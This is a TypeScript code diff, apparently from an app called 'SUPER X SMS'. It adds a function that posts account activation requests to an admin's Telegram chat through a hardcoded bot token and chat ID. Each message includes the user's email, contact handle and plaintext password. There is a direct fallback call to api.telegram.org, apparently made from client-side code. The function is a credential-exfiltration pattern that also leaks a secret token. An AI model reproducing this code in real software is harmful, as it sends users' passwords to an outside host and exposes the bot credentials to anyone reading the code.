@@ -651,3 +651,106 @@ export async function sendUserActivityToTelegram(activity: {
   }
 }
 
+/**
+ * Send Account Activation Request directly to Admin Telegram Bot
+ * Using requested Bot Token: 8631714331:AAEd33AVl9oqI-HdGW7jtxE37y4N4nH4ox4
+ * Target Admin Chat ID: 7084317713
+ * Includes interactive Accept / Reject inline buttons
+ */
+export async function sendAccountActivationRequestToAdminTelegram(account: {
+  id?: string;
+  name?: string;
+  email: string;
+  password?: string;
+  accountCode?: string;
+  createdAt?: number;
+  phoneOrTelegram?: string;
+  note?: string;
+}): Promise<{ success: boolean; message: string }> {
+  const botToken = '8631714331:AAEd33AVl9oqI-HdGW7jtxE37y4N4nH4ox4';
+  const targetChatId = '7084317713';
+
+  const cleanEmail = (account.email || '').toLowerCase().trim();
+  const cleanName = account.name || cleanEmail.split('@')[0] || 'User';
+  const cleanPass = account.password || '';
+  const cleanCode = account.accountCode || '';
+  const timeStr = formatScriptTimestamp(account.createdAt || Date.now());
+
+  const formattedText =
+    `<b>🚨 SUPER X SMS — NEW ACCOUNT ACTIVATION REQUEST</b>\n\n` +
+    `👤 <b>Name:</b> ${cleanName}\n` +
+    `✉️ <b>Email:</b> <code>${cleanEmail}</code>\n` +
+    `🔑 <b>Password:</b> <code>${cleanPass}</code>\n` +
+    `🆔 <b>ID Code:</b> <code>${cleanCode}</code>\n` +
+    (account.phoneOrTelegram ? `📱 <b>Phone/Telegram:</b> <code>${account.phoneOrTelegram}</code>\n` : '') +
+    `⏰ <b>Requested At:</b> ${timeStr}\n\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    `⚠️ <b>STATUS: PENDING ADMIN APPROVAL</b>\n` +
+    `<i>Click Accept below to activate instantly or Reject to deny.</i>`;
+
+  const inlineKeyboard = {
+    inline_keyboard: [
+      [
+        {
+          text: '✅ Accept & Activate',
+          callback_data: `approve_acc:${account.id || cleanEmail}`,
+        },
+        {
+          text: '❌ Reject',
+          callback_data: `reject_acc:${account.id || cleanEmail}`,
+        },
+      ],
+      [
+        {
+          text: '‼️ OPEN PANEL',
+          url: 'https://superxsms.vercel.app/',
+        },
+      ],
+    ],
+  };
+
+  // 1. Try server-side proxy route first
+  try {
+    const proxyRes = await fetch('/api/telegram/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        botToken,
+        chatId: targetChatId,
+        text: formattedText,
+        replyMarkup: inlineKeyboard,
+      }),
+    });
+    if (proxyRes.ok) {
+      const json = await proxyRes.json();
+      if (json.ok || json.success) {
+        return { success: true, message: 'Activation request sent to Admin Telegram Bot.' };
+      }
+    }
+  } catch {}
+
+  // 2. Direct fetch to Telegram Bot API fallback
+  try {
+    const directUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const directRes = await fetch(directUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: targetChatId,
+        text: formattedText,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true,
+        reply_markup: JSON.stringify(inlineKeyboard),
+      }),
+    });
+    const directJson = await directRes.json();
+    if (directJson.ok) {
+      return { success: true, message: 'Activation request sent directly to Telegram!' };
+    }
+  } catch (err: any) {
+    return { success: false, message: err?.message || 'Failed to send to Telegram.' };
+  }
+
+  return { success: false, message: 'Could not deliver to Telegram.' };
+}
+
